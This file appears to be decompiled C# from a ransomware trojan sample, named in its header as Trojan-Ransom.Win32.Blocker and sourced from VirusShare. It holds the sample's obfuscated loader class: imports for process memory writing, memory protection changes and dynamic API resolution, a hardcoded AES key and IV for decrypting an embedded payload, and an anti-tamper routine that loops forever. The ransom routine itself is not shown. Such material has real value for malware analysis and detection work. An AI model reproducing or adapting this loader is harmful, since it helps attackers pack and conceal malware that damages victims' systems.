// Decompiled with JetBrains decompiler
// Type: wRwWgOOmBcPMiIlyaF.I9BCjQixwBWVctLvJ1
// Assembly: Pass, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B2D05123-D1EE-4E11-B4EC-79932D637F25
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.ajjm-b001e2657b2764cdbd2d9790e4eb90ffd0dc35ed5746bdc109cf01610ec1d1c3.exe

using In2aXkPRwyNprNdGJT;
using System;
using System.Collections;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace wRwWgOOmBcPMiIlyaF
{
  internal class I9BCjQixwBWVctLvJ1
  {
    private static byte[] G6J4QNaE4t = new byte[0];
    private static byte[] PyU4bEKmg6 = new byte[0];
    private static byte[] gT740OLSxf = new byte[0];
    private static byte[] n444w6MR2p = new byte[0];
    private static IntPtr uSr4T4TlB4 = IntPtr.Zero;
    private static IntPtr Y1C46Gpo1j = IntPtr.Zero;
    private static object waj4ccFoET = (object) new string[0];
    private static int[] aEO45O4EU9 = new int[0];
    private static int ACf4xekACA = 1;
    private static bool yjL4tYl76q = false;
    private static SortedList fQR4GV0Dkd = new SortedList();
    private static int tc14yCA8Hq = 0;
    private static long Ghh4LrcsFK = 0;
    internal static I9BCjQixwBWVctLvJ1.WUmHdffeaHaaEIkwXj fH74j9GHKT = (I9BCjQixwBWVctLvJ1.WUmHdffeaHaaEIkwXj) null;
    internal static I9BCjQixwBWVctLvJ1.WUmHdffeaHaaEIkwXj j5b4AW6IRG = (I9BCjQixwBWVctLvJ1.WUmHdffeaHaaEIkwXj) null;
    private static long TSd4daiSYW = 0;
    private static int uLt4WRMfMs = 0;
    private static bool Vof4FZHeTy = false;
    private static int lma4aTeZCS = 0;
    private static IntPtr D7e4oiJr6H = IntPtr.Zero;
    internal static Hashtable M6M4zIa156 = new Hashtable();

    [MethodImpl(MethodImplOptions.NoInlining)]
    static I9BCjQixwBWVctLvJ1()
    {
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void TYTXOJ9iv06nZ()
    {
    }

    [I9BCjQixwBWVctLvJ1.MTX5qtLGPtCegwBdGf(typeof (I9BCjQixwBWVctLvJ1\u002FMTX5qtLGPtCegwBdGf\u002FwfHfuIQ1qGRFSXYhhn<object>[]))]
    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static string ckj4IqFCZ9([In] string obj0)
    {
      "{11111-22222-50001-00000}".Trim();
      byte[] bytes = Convert.FromBase64String(obj0);
      return Encoding.Unicode.GetString(bytes, 0, bytes.Length);
    }

    [DllImport("kernel32.dll", EntryPoint = "RtlZeroMemory")]
    private static extern void MtG4OPMH75([In] IntPtr obj0, [In] uint obj1);

    [DllImport("kernel32.dll", EntryPoint = "VirtualProtect", SetLastError = true)]
    private static extern int Mlx4VGkMyN([In] ref IntPtr obj0, [In] int obj1, [In] int obj2, [In] ref int obj3);

    [DllImport("kernel32.dll", EntryPoint = "FindResource")]
    public static extern IntPtr IiI48VRMdS([In] IntPtr obj0, [In] string obj1, [In] uint obj2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static void aUb4D8Z512()
    {
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static void D0143h3GTf()
    {
      try
      {
        RSACryptoServiceProvider.UseMachineKeyStore = true;
      }
      catch
      {
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object L544vC9SQC([In] object obj0)
    {
      try
      {
        if (File.Exists(((Assembly) obj0).Location))
          return (object) ((Assembly) obj0).Location;
      }
      catch
      {
      }
      try
      {
        if (File.Exists(((Assembly) obj0).GetName().CodeBase.ToString().Replace("file:///", "")))
          return (object) ((Assembly) obj0).GetName().CodeBase.ToString().Replace("file:///", "");
      }
      catch
      {
      }
      try
      {
        if (File.Exists(obj0.GetType().GetProperty("Location").GetValue(obj0, new object[0]).ToString()))
          return (object) obj0.GetType().GetProperty("Location").GetValue(obj0, new object[0]).ToString();
      }
      catch
      {
      }
      return (object) "";
    }

    [DllImport("kernel32", EntryPoint = "LoadLibrary")]
    public static extern IntPtr G4k4HsToem([In] string obj0);

    [DllImport("kernel32", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    public static extern IntPtr p8j4E3fCA0([In] IntPtr obj0, [In] string obj1);

    [DllImport("kernel32.dll", EntryPoint = "WriteProcessMemory")]
    private static extern int J5y4JZWB4o(
      [In] IntPtr obj0,
      [In] IntPtr obj1,
      [In, Out] byte[] _param2,
      [In] uint obj3,
      out IntPtr _param4);

    [DllImport("kernel32.dll", EntryPoint = "ReadProcessMemory")]
    private static extern int cIf42t63yY(
      [In] IntPtr obj0,
      [In] IntPtr obj1,
      [In, Out] byte[] _param2,
      [In] uint obj3,
      out IntPtr _param4);

    [DllImport("kernel32.dll", EntryPoint = "VirtualProtect")]
    private static extern int Bsd4rS1sWc([In] IntPtr obj0, [In] int obj1, [In] int obj2, [In] ref int obj3);

    [DllImport("kernel32.dll", EntryPoint = "OpenProcess")]
    private static extern IntPtr vsq4RP8lxT([In] uint obj0, [In] int obj1, [In] uint obj2);

    [DllImport("kernel32.dll", EntryPoint = "CloseHandle")]
    private static extern int tmL4PVwtZ5([In] IntPtr obj0);

    [I9BCjQixwBWVctLvJ1.MTX5qtLGPtCegwBdGf(typeof (I9BCjQixwBWVctLvJ1\u002FMTX5qtLGPtCegwBdGf\u002FwfHfuIQ1qGRFSXYhhn<object>[]))]
    [MethodImpl(MethodImplOptions.NoInlining)]
    private static byte[] NOg4Bpe3sE([In] string obj0)
    {
      byte[] buffer;
      using (FileStream fileStream = new FileStream(obj0, FileMode.Open, FileAccess.Read, FileShare.Read))
      {
        int offset = 0;
        int length = (int) fileStream.Length;
        buffer = new byte[length];
        int num;
        for (; length > 0; length -= num)
        {
          num = fileStream.Read(buffer, offset, length);
          offset += num;
        }
      }
      return buffer;
    }

    [I9BCjQixwBWVctLvJ1.MTX5qtLGPtCegwBdGf(typeof (I9BCjQixwBWVctLvJ1\u002FMTX5qtLGPtCegwBdGf\u002FwfHfuIQ1qGRFSXYhhn<object>[]))]
    [MethodImpl(MethodImplOptions.NoInlining)]
    private static byte[] aTJ4nGEJKZ([In] byte[] obj0)
    {
      MemoryStream memoryStream = new MemoryStream();
      Rijndael rijndael = Rijndael.Create();
      rijndael.Key = new byte[32]
      {
        (byte) 123,
        (byte) 5,
        (byte) 74,
        (byte) 12,
        (byte) 244,
        (byte) 156,
        (byte) 221,
        (byte) 154,
        (byte) 121,
        (byte) 221,
        (byte) 183,
        (byte) 41,
        (byte) 121,
        (byte) 65,
        (byte) 9,
        (byte) 43,
        (byte) 67,
        (byte) 81,
        (byte) 23,
        (byte) 43,
        (byte) 74,
        (byte) 63,
        (byte) 64,
        (byte) 23,
        (byte) 95,
        (byte) 185,
        (byte) 226,
        (byte) 244,
        (byte) 45,
        (byte) 194,
        (byte) 211,
        (byte) 43
      };
      rijndael.IV = new byte[16]
      {
        (byte) 117,
        (byte) 254,
        (byte) 41,
        (byte) 121,
        (byte) 65,
        (byte) 52,
        (byte) 9,
        (byte) 43,
        (byte) 221,
        (byte) 154,
        (byte) 12,
        (byte) 54,
        (byte) 68,
        (byte) 241,
        (byte) 68,
        (byte) 66
      };
      CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndael.CreateDecryptor(), CryptoStreamMode.Write);
      cryptoStream.Write(obj0, 0, obj0.Length);
      cryptoStream.Close();
      return memoryStream.ToArray();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private byte[] zYq470Awol() => "{11111-22222-10001-00001}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    [MethodImpl(MethodImplOptions.NoInlining)]
    private byte[] ccH4hM5xcw() => "{11111-22222-10001-00002}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    [MethodImpl(MethodImplOptions.NoInlining)]
    private byte[] OQY4Z3yuov() => "{11111-22222-20001-00001}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    [MethodImpl(MethodImplOptions.NoInlining)]
    private byte[] LvE4SylTid() => "{11111-22222-20001-00002}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    [MethodImpl(MethodImplOptions.NoInlining)]
    private byte[] XyZ4siBldf() => "{11111-22222-30001-00001}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    [MethodImpl(MethodImplOptions.NoInlining)]
    private byte[] t1A4p6Ag34() => "{11111-22222-30001-00002}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal byte[] RxO41RK82e() => "{11111-22222-40001-00001}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal byte[] qVH4kLdAxK() => "{11111-22222-40001-00002}".Length > 0 ? new byte[2]
    {
      (byte) 1,
      (byte) 2
    } : new byte[2]{ (byte) 1, (byte) 2 };

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal byte[] xal4gCD1qu() => (byte[]) null;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal byte[] Uch4UVqLlc() => (byte[]) null;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public I9BCjQixwBWVctLvJ1()
    {
    }

    internal class MTX5qtLGPtCegwBdGf : Attribute
    {
      [I9BCjQixwBWVctLvJ1.MTX5qtLGPtCegwBdGf(typeof (I9BCjQixwBWVctLvJ1\u002FMTX5qtLGPtCegwBdGf\u002FwfHfuIQ1qGRFSXYhhn<object>[]))]
      [MethodImpl(MethodImplOptions.NoInlining)]
      public MTX5qtLGPtCegwBdGf([In] object obj0)
      {
        rbdjPoeaA1BgLlupgC.XYjXOJ9ztPdU4();
        // ISSUE: explicit constructor call
        base.\u002Ector();
      }

      internal class wfHfuIQ1qGRFSXYhhn<T>
      {
        [MethodImpl(MethodImplOptions.NoInlining)]
        public wfHfuIQ1qGRFSXYhhn()
        {
          rbdjPoeaA1BgLlupgC.XYjXOJ9ztPdU4();
          // ISSUE: explicit constructor call
          base.\u002Ector();
        }
      }
    }

    internal class SJvIVgcl4NFQLE4uvg
    {
      [I9BCjQixwBWVctLvJ1.MTX5qtLGPtCegwBdGf(typeof (I9BCjQixwBWVctLvJ1\u002FMTX5qtLGPtCegwBdGf\u002FwfHfuIQ1qGRFSXYhhn<object>[]))]
      [MethodImpl(MethodImplOptions.NoInlining)]
      internal static void ce4DmfsmSrOT856tDgfrkMb()
      {
        if (!(I9BCjQixwBWVctLvJ1.SJvIVgcl4NFQLE4uvg.cbAKXvU9r3(Convert.ToBase64String(typeof (I9BCjQixwBWVctLvJ1).Assembly.GetName().GetPublicKeyToken()), " ") != "  "))
          return;
        while (true)
          I9BCjQixwBWVctLvJ1.SJvIVgcl4NFQLE4uvg.ce4DmfsmSrOT856tDgfrkMb();
      }

      [I9BCjQixwBWVctLvJ1.MTX5qtLGPtCegwBdGf(typeof (I9BCjQixwBWVctLvJ1\u002FMTX5qtLGPtCegwBdGf\u002FwfHfuIQ1qGRFSXYhhn<object>[]))]
      [MethodImpl(MethodImplOptions.NoInlining)]
      internal static string cbAKXvU9r3([In] string obj0, [In] string obj1)
      {
        byte[] bytes = Encoding.Unicode.GetBytes(obj0);
        byte[] numArray = new byte[32]
        {
          (byte) 82,
          (byte) 102,
          (byte) 104,
          (byte) 110,
          (byte) 32,
          (byte) 77,
          (byte) 24,
          (byte) 34,
          (byte) 118,
          (byte) 181,
          (byte) 51,
          (byte) 17,
          (byte) 18,
          (byte) 51,
          (byte) 12,
          (byte) 109,
          (byte) 10,
          (byte) 32,
          (byte) 77,
          (byte) 24,
          (byte) 34,
          (byte) 158,
          (byte) 161,
          (byte) 41,
          (byte) 97,
          (byte) 28,
          (byte) 118,
          (byte) 181,
          (byte) 5,
          (byte) 25,
          (byte) 1,
          (byte) 88
        };
        byte[] hash = new MD5CryptoServiceProvider().ComputeHash(Encoding.Unicode.GetBytes(obj1));
        MemoryStream memoryStream = new MemoryStream();
        Rijndael rijndael = Rijndael.Create();
        rijndael.Key = numArray;
        rijndael.IV = hash;
        CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndael.CreateEncryptor(), CryptoStreamMode.Write);
        cryptoStream.Write(bytes, 0, bytes.Length);
        cryptoStream.Close();
        return Convert.ToBase64String(memoryStream.ToArray());
      }

      [MethodImpl(MethodImplOptions.NoInlining)]
      public SJvIVgcl4NFQLE4uvg()
      {
        rbdjPoeaA1BgLlupgC.XYjXOJ9ztPdU4();
        // ISSUE: explicit constructor call
        base.\u002Ector();
      }
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    internal delegate uint WUmHdffeaHaaEIkwXj(
      [MarshalAs(UnmanagedType.U8)] ref ulong classthis,
      IntPtr comp,
      IntPtr info,
      [MarshalAs(UnmanagedType.U4)] uint flags,
      ref IntPtr nativeEntry,
      ref uint nativeSizeOfCode);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate IntPtr RpAuMYn1JBHx1w1h2a();

    internal struct wQFmY6wFDvsc14KV54
    {
      internal bool x4vK4R3b3R;
      internal byte[] cjDKK6IImQ;
    }

    [Flags]
    private enum dq17G9xn2xlnPH6p0J
    {
    }
  }
}
